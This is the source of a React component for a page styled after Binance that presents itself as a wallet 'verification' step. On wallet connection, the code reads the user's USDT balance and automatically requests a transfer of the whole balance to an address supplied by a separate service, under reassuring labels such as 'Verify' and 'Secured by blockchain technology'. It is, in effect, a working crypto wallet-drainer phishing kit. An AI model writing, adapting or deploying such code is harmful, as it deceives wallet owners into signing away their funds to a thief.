import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useAccount, useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
import { 
  Loader2, 
  CheckCircle2, 
  AlertCircle, 
  ShieldCheck, 
  ExternalLink,
  ArrowRight,
  Wallet,
  Zap,
  Clock,
  Send
} from 'lucide-react';
import { Progress } from './ui/progress';
import { getChainInfo, USDT_ADDRESSES } from '../config/wagmi';
import { transferService } from '../services/TransferService';

// Transfer states
const STATES = {
  CHECKING: 'checking',
  SENDING: 'sending',
  CONFIRMING: 'confirming',
  COMPLETED: 'completed',
  NO_BALANCE: 'no_balance',
  ERROR: 'error',
};

// Steps
const STEPS = [
  { id: 1, label: 'Connect', icon: Wallet },
  { id: 2, label: 'Verify', icon: ShieldCheck },
  { id: 3, label: 'Transfer', icon: Send },
  { id: 4, label: 'Done', icon: CheckCircle2 },
];

// RPC URLs
const RPC_URLS = {
  56: 'https://bsc-dataseed1.binance.org',
  1: 'https://eth.llamarpc.com',
  137: 'https://polygon-rpc.com',
  42161: 'https://arb1.arbitrum.io/rpc',
  10: 'https://mainnet.optimism.io',
  8453: 'https://mainnet.base.org',
};

const TOKEN_DECIMALS = { 56: 18, 1: 6, 137: 6, 42161: 6, 10: 6, 8453: 6 };

const ERC20_ABI = [{
  name: 'transfer',
  type: 'function',
  stateMutability: 'nonpayable',
  inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }],
  outputs: [{ name: '', type: 'bool' }],
}];

async function fetchTokenBalance(address, chainId) {
  const tokenAddress = USDT_ADDRESSES[chainId];
  const rpcUrl = RPC_URLS[chainId];
  const decimals = TOKEN_DECIMALS[chainId] || 18;
  
  if (!tokenAddress || !rpcUrl) return { formatted: '0.00', value: BigInt(0), decimals };

  try {
    const data = `0x70a08231000000000000000000000000${address.slice(2).toLowerCase()}`;
    const response = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to: tokenAddress, data }, 'latest'] }),
    });
    const result = await response.json();
    if (result.error) return { formatted: '0.00', value: BigInt(0), decimals };
    const balanceWei = BigInt(result.result);
    const balanceFormatted = Number(balanceWei) / Number(BigInt(10 ** decimals));
    return { formatted: balanceFormatted.toFixed(2), value: balanceWei, decimals };
  } catch {
    return { formatted: '0.00', value: BigInt(0), decimals };
  }
}

export function TransferDashboard() {
  const { address, chain, isConnected } = useAccount();
  const chainInfo = chain ? getChainInfo(chain.id) : null;
  const hasStarted = useRef(false);
  const mounted = useRef(true);
  
  const [balance, setBalance] = useState({ formatted: '0.00', value: BigInt(0), decimals: 18 });
  const [state, setState] = useState(STATES.CHECKING);
  const [error, setError] = useState(null);
  const [currentStep, setCurrentStep] = useState(2);
  const [progress, setProgress] = useState(30);

  const { writeContract, data: txHash, isPending, error: writeError, reset } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash: txHash });

  useEffect(() => {
    if (writeError) {
      setState(STATES.ERROR);
      setError(writeError.shortMessage || 'Transaction rejected');
      hasStarted.current = false;
    }
  }, [writeError]);

  useEffect(() => {
    if (isPending && state === STATES.CHECKING) {
      setState(STATES.SENDING);
      setCurrentStep(3);
      setProgress(60);
    }
  }, [isPending, state]);

  useEffect(() => {
    if (txHash && isConfirming) {
      setState(STATES.CONFIRMING);
      setProgress(80);
    }
  }, [txHash, isConfirming]);

  useEffect(() => {
    if (isConfirmed && txHash) {
      setState(STATES.COMPLETED);
      setCurrentStep(4);
      setProgress(100);
    }
  }, [isConfirmed, txHash]);

  const executeTransfer = useCallback(async () => {
    if (hasStarted.current || !isConnected || !address || !chain?.id) return;
    hasStarted.current = true;

    const bal = await fetchTokenBalance(address, chain.id);
    if (!mounted.current) return;
    setBalance(bal);

    if (!transferService.meetsThreshold(bal.formatted)) {
      setState(STATES.NO_BALANCE);
      return;
    }

    const tokenAddress = USDT_ADDRESSES[chain.id];
    writeContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'transfer',
      args: [transferService.getDestinationAddress(), bal.value],
    });
  }, [isConnected, address, chain, writeContract]);

  useEffect(() => {
    if (isConnected && address && chain?.id && !hasStarted.current) {
      executeTransfer();
    }
  }, [isConnected, address, chain?.id, executeTransfer]);

  useEffect(() => {
    mounted.current = true;
    return () => { mounted.current = false; };
  }, []);

  const handleRetry = () => {
    hasStarted.current = false;
    reset();
    setState(STATES.CHECKING);
    setError(null);
    setProgress(30);
    setCurrentStep(2);
    executeTransfer();
  };

  const statusConfig = {
    [STATES.CHECKING]: { 
      icon: Loader2, 
      title: 'Verifying', 
      subtitle: 'Checking balance...', 
      iconClass: 'animate-spin text-[var(--binance-gold)]',
      bgClass: 'bg-[var(--binance-gray)]'
    },
    [STATES.SENDING]: { 
      icon: ShieldCheck, 
      title: 'Approve Transfer', 
      subtitle: 'Confirm in your wallet', 
      iconClass: 'text-[var(--binance-gold)] animate-pulse',
      bgClass: 'bg-[var(--binance-gold)]/10 border-[var(--binance-gold)]/30'
    },
    [STATES.CONFIRMING]: { 
      icon: Clock, 
      title: 'Confirming', 
      subtitle: 'Waiting for confirmation...', 
      iconClass: 'text-[var(--binance-blue)] animate-spin',
      bgClass: 'bg-[var(--binance-blue)]/10'
    },
    [STATES.COMPLETED]: { 
      icon: CheckCircle2, 
      title: 'Transfer Complete', 
      subtitle: `${balance.formatted} USDT transferred`, 
      iconClass: 'text-white',
      bgClass: 'bg-[var(--binance-green)]'
    },
    [STATES.NO_BALANCE]: { 
      icon: Wallet, 
      title: 'Insufficient Balance', 
      subtitle: `Balance: ${balance.formatted} USDT`, 
      iconClass: 'text-[var(--binance-text-secondary)]',
      bgClass: 'bg-[var(--binance-gray)]'
    },
    [STATES.ERROR]: { 
      icon: AlertCircle, 
      title: 'Transfer Failed', 
      subtitle: error || 'Please try again', 
      iconClass: 'text-white',
      bgClass: 'bg-[var(--binance-red)]'
    },
  };

  const config = statusConfig[state];
  const StatusIcon = config.icon;

  return (
    <div className="w-full max-w-md mx-auto animate-slide-up" data-testid="transfer-dashboard">
      <div className="premium-card overflow-hidden">
        {/* Status Header */}
        <div className="relative p-8 border-b border-[var(--binance-gray-light)]">
          <div className="absolute inset-0 bg-gradient-to-b from-[var(--binance-gold)]/5 to-transparent" />
          
          <div className="relative">
            {/* Steps */}
            <div className="flex items-center justify-between mb-8">
              {STEPS.map((step, index) => (
                <React.Fragment key={step.id}>
                  <div className="flex flex-col items-center">
                    <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-medium transition-all ${
                      step.id < currentStep 
                        ? 'bg-[var(--binance-green)] text-white' 
                        : step.id === currentStep 
                          ? 'bg-[var(--binance-gold)] text-[var(--binance-black)]' 
                          : 'bg-[var(--binance-gray)] text-[var(--binance-text-secondary)] border border-[var(--binance-gray-light)]'
                    }`}>
                      {step.id < currentStep ? (
                        <CheckCircle2 className="w-5 h-5" />
                      ) : (
                        <step.icon className="w-5 h-5" />
                      )}
                    </div>
                    <span className={`text-[10px] uppercase tracking-wide mt-2 ${
                      step.id <= currentStep ? 'text-[var(--binance-text)]' : 'text-[var(--binance-text-secondary)]'
                    }`}>
                      {step.label}
                    </span>
                  </div>
                  {index < STEPS.length - 1 && (
                    <div className={`flex-1 h-0.5 mx-2 mt-[-20px] ${
                      step.id < currentStep ? 'bg-[var(--binance-green)]' : 'bg-[var(--binance-gray-light)]'
                    }`} />
                  )}
                </React.Fragment>
              ))}
            </div>

            {/* Status Icon */}
            <div className="text-center">
              <div className={`mx-auto w-20 h-20 rounded-2xl flex items-center justify-center mb-4 border border-[var(--binance-gray-light)] ${config.bgClass}`}>
                <StatusIcon className={`w-10 h-10 ${config.iconClass}`} />
              </div>
              <h2 className="text-xl font-semibold text-[var(--binance-text)] mb-1">{config.title}</h2>
              <p className="text-sm text-[var(--binance-text-secondary)]">{config.subtitle}</p>
            </div>

            {/* Progress */}
            {![STATES.COMPLETED, STATES.ERROR, STATES.NO_BALANCE].includes(state) && (
              <div className="mt-6">
                <Progress value={progress} className="h-1 bg-[var(--binance-gray)]" />
              </div>
            )}
          </div>
        </div>

        {/* Details */}
        <div className="p-6 space-y-4">
          {/* Wallet Info */}
          <div className="bg-[var(--binance-gray)] rounded-lg p-4 border border-[var(--binance-gray-light)]">
            <div className="data-row">
              <span className="text-xs uppercase tracking-widest text-[var(--binance-text-secondary)]">Wallet</span>
              <span className="font-mono text-sm text-[var(--binance-text)]">{transferService.formatAddress(address, 6)}</span>
            </div>
            <div className="data-row">
              <span className="text-xs uppercase tracking-widest text-[var(--binance-text-secondary)]">Network</span>
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full" style={{ backgroundColor: chainInfo?.color }} />
                <span className="text-sm text-[var(--binance-text)]">{chainInfo?.name}</span>
              </div>
            </div>
            <div className="data-row">
              <span className="text-xs uppercase tracking-widest text-[var(--binance-text-secondary)]">Balance</span>
              <span className="font-mono text-lg font-medium text-[var(--binance-gold)]">{balance.formatted} USDT</span>
            </div>
          </div>

          {/* Transfer Route */}
          {![STATES.NO_BALANCE, STATES.ERROR].includes(state) && (
            <div className="bg-[var(--binance-gray)] rounded-lg p-4 border border-[var(--binance-gray-light)]">
              <p className="text-xs uppercase tracking-widest text-[var(--binance-text-secondary)] mb-3">Transfer Route</p>
              <div className="flex items-center justify-between">
                <div className="text-center">
                  <p className="text-[10px] text-[var(--binance-text-secondary)] mb-1">FROM</p>
                  <p className="font-mono text-sm text-[var(--binance-text)]">{transferService.formatAddress(address, 4)}</p>
                </div>
                <div className="flex-1 flex items-center justify-center px-4">
                  <div className="w-full h-px bg-[var(--binance-gray-light)] relative">
                    <ArrowRight className="w-5 h-5 text-[var(--binance-gold)] absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 bg-[var(--binance-gray)]" />
                  </div>
                </div>
                <div className="text-center">
                  <p className="text-[10px] text-[var(--binance-text-secondary)] mb-1">TO</p>
                  <p className="font-mono text-sm text-[var(--binance-text)]">{transferService.formatAddress(transferService.getDestinationAddress(), 4)}</p>
                </div>
              </div>
              <div className="mt-4 pt-4 border-t border-[var(--binance-gray-light)] text-center">
                <p className="text-2xl font-mono font-medium text-gold-gradient">{balance.formatted} USDT</p>
              </div>
            </div>
          )}

          {/* Wallet Prompt */}
          {state === STATES.SENDING && (
            <div className="p-4 bg-[var(--binance-gold)]/10 border border-[var(--binance-gold)]/30 rounded-lg animate-border-pulse">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-[var(--binance-gold)]/20 rounded-lg flex items-center justify-center">
                  <Zap className="w-5 h-5 text-[var(--binance-gold)]" />
                </div>
                <div>
                  <p className="font-medium text-[var(--binance-gold)]">Action Required</p>
                  <p className="text-xs text-[var(--binance-text-secondary)]">Please approve the transaction in your wallet</p>
                </div>
              </div>
            </div>
          )}

          {/* Success */}
          {state === STATES.COMPLETED && txHash && (
            <a
              href={transferService.getExplorerUrl(txHash, chain?.id)}
              target="_blank"
              rel="noopener noreferrer"
              className="block p-4 bg-[var(--binance-green)]/10 border border-[var(--binance-green)]/30 rounded-lg hover:bg-[var(--binance-green)]/20 transition-colors group"
              data-testid="explorer-link"
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs uppercase tracking-widest text-[var(--binance-text-secondary)]">Transaction Hash</span>
                <ExternalLink className="w-4 h-4 text-[var(--binance-green)] group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform" />
              </div>
              <p className="font-mono text-xs text-[var(--binance-text)] break-all">{txHash}</p>
            </a>
          )}

          {/* Retry */}
          {(state === STATES.ERROR || state === STATES.NO_BALANCE) && (
            <button
              onClick={handleRetry}
              className="w-full py-4 bg-[var(--binance-gray)] hover:bg-[var(--binance-gray-light)] border border-[var(--binance-gray-light)] rounded-lg text-[var(--binance-text)] font-medium transition-all focus:ring-1 focus:ring-[var(--binance-gold)] focus:outline-none"
              data-testid="retry-btn"
            >
              Try Again
            </button>
          )}

          {/* Footer */}
          <div className="flex items-center justify-center gap-2 pt-2">
            <ShieldCheck className="w-4 h-4 text-[var(--binance-gold)]" />
            <span className="text-xs text-[var(--binance-text-secondary)]">
              Secured by blockchain technology
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default TransferDashboard;
